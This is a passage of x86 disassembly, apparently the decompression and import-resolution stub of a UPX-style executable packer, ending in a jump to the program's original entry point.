  539a4a:	shl    esi,0x4
  539a4d:	mov    DWORD PTR [esp],esi
  539a50:	add    eax,0x644
  539a55:	mov    DWORD PTR [esp+0x20],0x4
  539a5d:	mov    DWORD PTR [esp+0x4],eax
  539a61:	mov    DWORD PTR [esp+0x1c],0x1
  539a69:	mov    eax,0x1
  539a6e:	mov    ebp,DWORD PTR [esp+0x4]
  539a72:	add    eax,eax
  539a74:	mov    DWORD PTR [esp+0x18],eax
  539a78:	add    ebp,eax
  539a7a:	cmp    DWORD PTR [esp+0x48],0xffffff
  539a82:	ja     0x539a9c
  539a84:	cmp    ebx,DWORD PTR [esp+0x4c]
  539a88:	je     0x539b78
  539a8e:	shl    DWORD PTR [esp+0x48],0x8
  539a93:	movzx  eax,BYTE PTR [ebx]
  539a96:	shl    edi,0x8
  539a99:	inc    ebx
  539a9a:	or     edi,eax
  539a9c:	mov    eax,DWORD PTR [esp+0x48]
  539aa0:	mov    dx,WORD PTR [ebp+0x0]
  539aa4:	shr    eax,0xb
  539aa7:	movzx  esi,dx
  539aaa:	imul   eax,esi
  539aad:	cmp    edi,eax
  539aaf:	jae    0x539acc
  539ab1:	mov    DWORD PTR [esp+0x48],eax
  539ab5:	mov    eax,0x800
  539aba:	sub    eax,esi
  539abc:	sar    eax,0x5
  539abf:	lea    eax,[edx+eax*1]
  539ac2:	mov    WORD PTR [ebp+0x0],ax
  539ac6:	mov    eax,DWORD PTR [esp+0x18]
  539aca:	jmp    0x539aeb
  539acc:	sub    DWORD PTR [esp+0x48],eax
  539ad0:	sub    edi,eax
  539ad2:	mov    eax,edx
  539ad4:	shr    ax,0x5
  539ad8:	sub    dx,ax
  539adb:	mov    eax,DWORD PTR [esp+0x18]
  539adf:	mov    WORD PTR [ebp+0x0],dx
  539ae3:	mov    edx,DWORD PTR [esp+0x1c]
  539ae7:	inc    eax
  539ae8:	or     DWORD PTR [esp],edx
  539aeb:	mov    ecx,DWORD PTR [esp+0x20]
  539aef:	shl    DWORD PTR [esp+0x1c],1
  539af3:	dec    ecx
  539af4:	mov    DWORD PTR [esp+0x20],ecx
  539af8:	jne    0x539a6e
  539afe:	mov    esi,DWORD PTR [esp]
  539b01:	inc    esi
  539b02:	mov    DWORD PTR [esp+0x5c],esi
  539b06:	je     0x539b61
  539b08:	mov    ecx,DWORD PTR [esp+0xc]
  539b0c:	mov    ebp,DWORD PTR [esp+0x74]
  539b10:	add    ecx,0x2
  539b13:	cmp    DWORD PTR [esp+0x5c],ebp
  539b17:	ja     0x539b78
  539b19:	mov    eax,DWORD PTR [esp+0xa0]
  539b20:	mov    edx,ebp
  539b22:	sub    eax,DWORD PTR [esp+0x5c]
  539b26:	add    edx,DWORD PTR [esp+0xa0]
  539b2d:	lea    esi,[eax+ebp*1]
  539b30:	mov    al,BYTE PTR [esi]
  539b32:	inc    esi
  539b33:	mov    BYTE PTR [esp+0x73],al
  539b37:	mov    BYTE PTR [edx],al
  539b39:	inc    edx
  539b3a:	inc    DWORD PTR [esp+0x74]
  539b3e:	dec    ecx
  539b3f:	je     0x539b50
  539b41:	mov    ebp,DWORD PTR [esp+0xa4]
  539b48:	cmp    DWORD PTR [esp+0x74],ebp
  539b4c:	jb     0x539b30
  539b4e:	jmp    0x539b61
  539b50:	mov    eax,DWORD PTR [esp+0xa4]
  539b57:	cmp    DWORD PTR [esp+0x74],eax
  539b5b:	jb     0x53921c
  539b61:	cmp    DWORD PTR [esp+0x48],0xffffff
  539b69:	ja     0x539b80
  539b6b:	cmp    ebx,DWORD PTR [esp+0x4c]
  539b6f:	mov    eax,0x1
  539b74:	je     0x539b9f
  539b76:	jmp    0x539b7f
  539b78:	mov    eax,0x1
  539b7d:	jmp    0x539b9f
  539b7f:	inc    ebx
  539b80:	sub    ebx,DWORD PTR [esp+0x94]
  539b87:	xor    eax,eax
  539b89:	mov    edx,DWORD PTR [esp+0x9c]
  539b90:	mov    ecx,DWORD PTR [esp+0x74]
  539b94:	mov    DWORD PTR [edx],ebx
  539b96:	mov    ebx,DWORD PTR [esp+0xa8]
  539b9d:	mov    DWORD PTR [ebx],ecx
  539b9f:	add    esp,0x7c
  539ba2:	pop    ebx
  539ba3:	pop    esi
  539ba4:	pop    edi
  539ba5:	pop    ebp
  539ba6:	add    esi,DWORD PTR [ebx-0x4]
  539ba9:	add    edi,DWORD PTR [ebx-0x8]
  539bac:	xor    eax,eax
  539bae:	lea    ecx,[esp-0x100]
  539bb5:	mov    esp,ebp
  539bb7:	push   eax
  539bb8:	cmp    esp,ecx
  539bba:	jne    0x539bb7
  539bbc:	mov    esp,ebp
  539bbe:	xor    ecx,ecx
  539bc0:	pop    esi
  539bc1:	mov    edi,esi
  539bc3:	mov    ecx,0x2263
  539bc8:	mov    al,BYTE PTR [edi]
  539bca:	inc    edi
  539bcb:	sub    al,0xe8
  539bcd:	cmp    al,0x1
  539bcf:	ja     0x539bc8
  539bd1:	cmp    BYTE PTR [edi],0x12
  539bd4:	jne    0x539bc8
  539bd6:	mov    eax,DWORD PTR [edi]
  539bd8:	mov    bl,BYTE PTR [edi+0x4]
  539bdb:	shr    ax,0x8
  539bdf:	rol    eax,0x10
  539be2:	xchg   ah,al
  539be4:	sub    eax,edi
  539be6:	sub    bl,0xe8
  539be9:	add    eax,esi
  539beb:	mov    DWORD PTR [edi],eax
  539bed:	add    edi,0x5
  539bf0:	mov    al,bl
  539bf2:	loop   0x539bcd
  539bf4:	lea    edi,[esi+0x137000]
  539bfa:	mov    eax,DWORD PTR [edi]
  539bfc:	or     eax,eax
  539bfe:	je     0x539c45
  539c00:	mov    ebx,DWORD PTR [edi+0x4]
  539c03:	lea    eax,[eax+esi*1+0x13a634]
  539c0a:	add    ebx,esi
  539c0c:	push   eax
  539c0d:	add    edi,0x8
  539c10:	call   DWORD PTR [esi+0x13a670]
  539c16:	xchg   ebp,eax
  539c17:	mov    al,BYTE PTR [edi]
  539c19:	inc    edi
  539c1a:	or     al,al
  539c1c:	je     0x539bfa
  539c1e:	mov    ecx,edi
  539c20:	jns    0x539c29
  539c22:	movzx  eax,WORD PTR [edi]
  539c25:	inc    edi
  539c26:	push   eax
  539c27:	inc    edi
  539c28:	mov    ecx,0xaef24857
  539c2d:	push   ebp
  539c2e:	call   DWORD PTR [esi+0x13a674]
  539c34:	or     eax,eax
  539c36:	je     0x539c3f
  539c38:	mov    DWORD PTR [ebx],eax
  539c3a:	add    ebx,0x4
  539c3d:	jmp    0x539c17
  539c3f:	call   DWORD PTR [esi+0x13a684]
  539c45:	mov    ebp,DWORD PTR [esi+0x13a678]
  539c4b:	lea    edi,[esi-0x1000]
  539c51:	mov    ebx,0x1000
  539c56:	push   eax
  539c57:	push   esp
  539c58:	push   0x4
  539c5a:	push   ebx
  539c5b:	push   edi
  539c5c:	call   ebp
  539c5e:	lea    eax,[edi+0x1e7]
  539c64:	and    BYTE PTR [eax],0x7f
  539c67:	and    BYTE PTR [eax+0x28],0x7f
  539c6b:	pop    eax
  539c6c:	push   eax
  539c6d:	push   esp
  539c6e:	push   eax
  539c6f:	push   ebx
  539c70:	push   edi
  539c71:	call   ebp
  539c73:	pop    eax
  539c74:	popa   
  539c75:	lea    eax,[esp-0x80]
  539c79:	push   0x0
  539c7b:	cmp    esp,eax
  539c7d:	jne    0x539c79
  539c7f:	sub    esp,0xffffff80
  539c82:	jmp    0x401648
	...
